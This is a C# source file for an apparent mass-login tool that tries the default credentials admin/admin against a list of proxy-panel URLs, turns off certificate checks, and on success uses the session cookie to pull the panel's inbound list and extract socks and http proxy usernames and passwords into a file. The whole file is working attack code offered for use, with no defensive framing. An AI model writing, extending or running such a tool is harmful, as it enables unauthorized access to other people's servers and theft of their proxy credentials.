using Newtonsoft.Json.Linq;

namespace _3x_bruter
{
    public class PanelBruteForcer
    {
        /// <summary>
        /// Performs brute-force on panels using the provided file and extracts proxies if specified.
        /// </summary>
        /// <param name="file">The file containing panel URLs.</param>
        /// <param name="showProxy">Indicates whether to display extracted proxies.</param>
        public async Task BrutePanelAsync(string file, bool showProxy = false)
        {
            var validPanels = new List<string>();
            Console.WriteLine("[+] Processing lines.");

            var lines = await File.ReadAllLinesAsync(file);
            using var handler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (sender, certificate, chain, sslPolicyErrors) => true
            };

            using var client = new HttpClient(handler);
            var tasks = new List<Task>();
            var outputFile = showProxy ? file.Replace(".txt", "-bruted-proxy.txt") : null;

            if (showProxy)
            {
                await File.Create(outputFile).DisposeAsync();
            }

            foreach (var line in lines)
            {
                tasks.Add(Task.Run(async () =>
                {
                    try
                    {
                        var (result, sessionCookie) = await SendPostRequest(client, line);

                        if (result.Contains("\"success\":true"))
                        {
                            lock (validPanels)
                            {
                                validPanels.Add(line);
                            }
                            Console.WriteLine("[+] Valid panel found: " + line);

                            if (showProxy && !string.IsNullOrEmpty(sessionCookie))
                            {
                                var inboundListResult = await GetInboundList(client, line, sessionCookie);
                                var proxy = ExtractProxies(inboundListResult, line.Replace("http://", "").Replace("https://", "").Split(":")[0]);

                                await File.AppendAllTextAsync(outputFile, proxy + "\n");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Error processing line {line}: {ex.Message}");
                    }
                }));
            }

            await Task.WhenAll(tasks);
            Console.WriteLine($"[+] Panels processed. Total valid panels: {validPanels.Count}");

            var validPanelsFile = file.Replace(".txt", "-bruted.txt");
            await File.WriteAllLinesAsync(validPanelsFile, validPanels);
            Console.WriteLine("[+] Successfully written to file.");
        }

        private async Task<(string Result, string SessionCookie)> SendPostRequest(HttpClient client, string url)
        {
            var content = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("username", "admin"),
                new KeyValuePair<string, string>("password", "admin"),
                new KeyValuePair<string, string>("LoginSecret", "")
            });

            var response = await client.PostAsync(url + "/login", content);
            var result = await response.Content.ReadAsStringAsync();
            var sessionCookie = response.Headers.GetValues("Set-Cookie")
                .FirstOrDefault(cookie => cookie.StartsWith("session="))?
                .Split(';')[0];

            return (result, sessionCookie);
        }

        private async Task<string> GetInboundList(HttpClient client, string url, string sessionCookie)
        {
            client.DefaultRequestHeaders.Clear();
            client.DefaultRequestHeaders.Add("Cookie", sessionCookie);

            var response = await client.PostAsync(url + "/panel/inbound/list", null);
            return await response.Content.ReadAsStringAsync();
        }

        private string ExtractProxies(string json, string ip)
        {
            var jsonObject = JObject.Parse(json);
            var objArray = (JArray)jsonObject["obj"];

            foreach (var item in objArray.OfType<JObject>())
            {
                var protocol = (string)item["protocol"];
                var port = (int)item["port"];

                if (protocol == "socks" || protocol == "http")
                {
                    var settings = (string)item["settings"];
                    var settingsObject = JObject.Parse(settings);

                    var username = (string)settingsObject["accounts"][0]["user"];
                    var password = (string)settingsObject["accounts"][0]["pass"];

                    Console.WriteLine($"{protocol}://{username}:{password}@{ip}:{port}");
                    return $"{protocol}://{username}:{password}@{ip}:{port}";
                }
            }
            return null;
        }
    }
}